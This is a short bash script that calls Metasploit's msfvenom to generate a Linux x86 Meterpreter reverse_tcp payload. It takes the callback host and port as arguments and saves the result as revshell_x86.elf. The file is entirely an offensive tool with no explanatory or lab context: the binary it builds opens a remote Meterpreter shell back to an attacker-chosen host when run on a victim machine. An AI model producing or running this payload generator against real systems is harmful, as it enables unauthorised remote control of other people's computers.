#! /usr/bin/env bash

/opt/metasploit/app/msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=$1 LPORT=$2 -f elf > revshell_x86.elf
